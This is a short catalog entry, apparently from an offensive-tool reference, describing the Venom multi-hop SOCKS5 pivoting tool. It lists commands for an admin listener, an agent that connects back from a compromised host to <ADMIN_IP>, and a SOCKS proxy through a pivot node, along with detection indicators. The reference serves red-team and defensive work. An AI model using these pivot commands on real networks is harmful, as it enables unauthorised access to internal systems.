---
Name: Venom
Description: Venom is a multi-hop SOCKS5 proxy/pivoting tool written in Go, with separate admin and agent binaries. The admin binary provides an interactive console (goto, socks, sshtunnel and other commands) for building and operating a chain of agent nodes, each reachable actively or passively, optionally with password authentication and port reuse against an already-listening service.
Author: elhoim
Created: 2026-11-09
Commands:
  - Command: ./admin_linux_x64 -lport <PORT>
    Description: Starts the admin console listening for an agent connection.
    Usecase: Operator side of a multi-hop SOCKS5 pivot.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS

  - Command: ./agent_linux_x64 -rhost <ADMIN_IP> -rport <PORT>
    Description: Connects an agent on a compromised host back to the admin console, joining the proxy chain.
    Usecase: Pivoting into an internal network segment.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS

  - Command: socks <LOCAL_PORT>
    Description: Console command run from the admin interactive prompt after selecting a node (goto <id>), starting a local SOCKS5 server proxied through that node's position in the chain.
    Usecase: Exposing a SOCKS5 proxy into the network reachable from a chosen pivot node.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS
Full_Path:
  - Filename: admin_linux_x64
  - Filename: agent_linux_x64
  - Filename: admin_win_x64.exe
  - Filename: agent_win_x64.exe
  - Path: Downloaded/compiled Venom admin/agent binaries, executed anywhere on the system.
Detection:
  - Command: Execution of a binary named admin_* or agent_* (or a renamed copy) with -lport, -rhost or -rport arguments.
  - Command: Outbound connections carrying SOCKS5 framing to an uncategorized host, including on a port that is also serving an unrelated legitimate service (port reuse).
Resources:
  - Link: https://github.com/Dliv3/Venom
---
